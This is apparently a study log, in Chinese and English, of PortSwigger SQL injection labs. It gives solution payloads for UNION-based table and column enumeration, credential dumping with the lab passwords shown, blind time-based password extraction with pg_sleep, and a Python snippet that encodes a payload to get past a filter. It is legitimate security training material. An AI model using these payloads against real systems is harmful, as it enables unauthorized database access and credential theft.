# Examples of SQL injection

## Retrieving hidden data

1. ✅ Lab : SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

   https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data

## Subverting application logic

2. ✅ Lab : SQL injection vulnerability allowing login bypass

   https://portswigger.net/web-security/sql-injection/lab-login-bypass

## SQL injection in different contexts

3. ✅ Lab : SQL injection with filter bypass via XML encoding

   https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
   
   > 没必要按照官方给的解题思路来解题，即没必要下载 [Hackvertor](https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100)，通过查看 Hackvertor 解本题的源代码，可知它其实只是做了一个 html 转义操作，所以说通过下面几行代码就可以实现啦～
   >
   > 注：Hackvertor 的源代码地址为 https://portswigger.net/bappstore/65033cbd2c344fbabe57ac060b5dd100，其解本题的源代码中还调用了库：https://github.com/unbescape/unbescape（Advanced yet easy to use escaping library for Java）
   >
   > ```python
   > import html
   > 
   > def html_encode(input_str):
   >     # 使用 html.escape 进行基础转义,详情见源码
   >     encoded_str = html.escape(input_str, quote=False)
   >     
   >     # 手动替换特定字符
   >     encoded_str = encoded_str.replace(" ", "&#32;")   # 空格
   >     encoded_str = encoded_str.replace("|", "&#124;") # 管道符
   >     encoded_str = encoded_str.replace("'", "&#39;")  # 单引号
   >     encoded_str = encoded_str.replace("~", "&#126;") # 波浪号
   >     return encoded_str
   > 
   > raw_string = "1 UNION SELECT concat(username,' : ',password) FROM users"
   > print(f"The encoded str: {html_encode(raw_string)}")
   > ```

# Examining the database

## Querying the database type and version

4. ✅ Lab : SQL injection attack, querying the database type and version on Oracle

   https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

   >```sql
   >GET /filter?category=Lifestyle' union SELECT banner,null FROM v$version--+
   >```
   >
   >知识扩展：
   >
   >**DUAL 表是什么？** 答：DUAL 是 Oracle 数据库中的一个特殊伪表，用于在不需要访问实际表时执行查询操作。它是由 Oracle 提供的系统表，仅包含一行和一列 .
   >
   >**为什么需要 DUAL 表？** 答：在 SQL 标准中，SELECT 语句通常需要一个 FROM 子句。而在某些场景下，我们并不需要访问实际表，只想执行一个简单的表达式或函数调用。DUAL 提供了一个简化的解决方案，使得查询符合语法要求。

5. ✅ Lab : SQL injection attack, querying the database type and version on MySQL and Microsoft

   https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

## Listing the contents of the database

6. ✅ Lab : SQL injection attack, listing the database contents on non-Oracle databases

   https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

   > 1. category=Gifts' order by 2--+
   >
   > 2. category=Gifts' union select '1',version()--+
   >
   >    Note that: not use the integer type in select statment
   >
   > 2. category=Gifts' union select '1',current_database()--+
   >
   >    Note that if you want to show the database name in postgreSQL, pls use the func of current_database()
   >
   > 3. category=Gifts' union select '1',STRING_AGG(table_name, ', ') from information_schema.tables--+
   >
   >    在 PostgreSQL 中，没有直接与 MySQL 的 GROUP_CONCAT 等价的函数，但可以使用 STRING_AGG 函数实现类似的功能。STRING_AGG 是 PostgreSQL 内置的聚合函数，用于将多行值连接成一个字符串，支持分隔符。
   >
   >    STRING_AGG(expression, delimiter)
   >    expression: 要连接的列或表达式。
   >    delimiter: 用于分隔每个值的字符串。
   >
   > 4. category=Gifts' union select '1',STRING_AGG(column_name, ', ') from information_schema.columns where table_name='users_tlffup'--+
   >
   > 5. category=Gifts' union select '1',STRING_AGG(CONCAT(username_bhofcj,':',password_amfmxo), ', ') from users_tlffup--+
   >
   >    ===> administrator:uybpu199jn5hwl1esemr, wiener:jwz2ej0n01nl8jbx7dtt, carlos:1gjsy3a7cniz4ox0wa0c
   >

7. ✅ Lab : SQL injection attack, listing the database contents on Oracle

   https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
   
   >1. category=Tech+gifts' order by 2--+
   >
   >2. category=Tech+gifts' union SELECT banner,'2' FROM v$version--+
   >
   >3. category=Tech+gifts' union SELECT LISTAGG(table_name, ', ') WITHIN GROUP (ORDER BY table_name),'2' from all_tables--+
   >
   >4. category=Tech+gifts' union SELECT LISTAGG(column_name, ', ') WITHIN GROUP (ORDER BY column_name),'2' from all_tab_columns where table_name='USERS_AFELXZ'--+
   >
   >5. category=Tech+gifts' union SELECT LISTAGG(USERNAME_WNKAOV || ' : ' || PASSWORD_TFDMYI, ', ') WITHIN GROUP (ORDER BY USERNAME_WNKAOV),'2' from USERS_AFELXZ--+
   >
   >   ===> administrator : zdd1sw7934z8ak17v881, carlos : 98sv1g07s3pi944kdssd, wiener : 9u0d87m3fcxgko86dbv6
   >

# UNION attacks

## Determining the number of columns required

8. ✅ Lab : SQL injection UNION attack, determining the number of columns returned by the query

https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

## Finding columns with a useful data type

9. ✅ Lab : SQL injection UNION attack, finding a column containing text

   https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

## Using a SQL injection UNION attack to retrieve interesting data

10. ✅ Lab : SQL injection UNION attack, retrieving data from other tables

    https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

## Retrieving multiple values within a single column

11. ✅ Lab : SQL injection UNION attack, retrieving multiple values in a single column

    https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column

# Blind SQL injection

## Exploiting blind SQL injection by triggering conditional responses

12. ✅⭐️ Lab: Blind SQL injection with conditional responses

    https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses

## Error-based SQL injection

#### Exploiting blind SQL injection by triggering conditional errors

13. ✅ Lab: Blind SQL injection with conditional errors

    https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors

#### Extracting sensitive data via verbose SQL error messages

14. ✅ Lab: Visible error-based SQL injection

    https://portswigger.net/web-security/sql-injection/blind/lab-sql-injection-visible-error-based

## Exploiting blind SQL injection by triggering time delays

15. ✅ Lab: Visible error-based SQL injection

    https://portswigger.net/web-security/sql-injection/blind/lab-time-delays

    >SELECT * FROM users WHERE username = 'admin' AND (SELECT pg_sleep(10))--+ 这条sql为什么不能在PostgreSQL中生效 ？答案：
    >
    >**子查询的结果类型不符合布尔逻辑 : **
    >
    >PostgreSQL 要求 WHERE 子句中的条件必须是布尔值 (TRUE、FALSE 或 NULL)，(SELECT pg_sleep(10)) 的返回类型是 void，这不是布尔值，因此会导致语法错误。
    >
    >**修正方式是将 pg_sleep 与布尔逻辑结合 : ** 
    >
    >使用 pg_sleep 的返回值与布尔逻辑条件，即：SELECT * FROM users WHERE username = 'admin' AND (SELECT pg_sleep(10) IS NULL);

16. ✅⭐️ Lab: Blind SQL injection with time delays and information retrieval

    https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval

    >详细解题代码已上传至 Github，这里简单说下哈：
    >
    >Get the password length : TrackingId=2c2BLTFJ7Ld1f21C' and (select case when (length((select password from users where username='administrator'))=20) then pg_sleep(10) else null end is null)--+
    >
    >Get the password value : TrackingId=2c2BLTFJ7Ld1f21C' and (select case when (ascii(substr((select password from users where username='administrator'),1,1))=100) then pg_sleep(10) else null end is null)--+

## Exploiting blind SQL injection using out-of-band (OAST) techniques

17. （`BurpSuite Pro`）Lab: Blind SQL injection with out-of-band interaction

    https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band

18. （`BurpSuite Pro`）Lab: Blind SQL injection with out-of-band data exfiltration

    https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
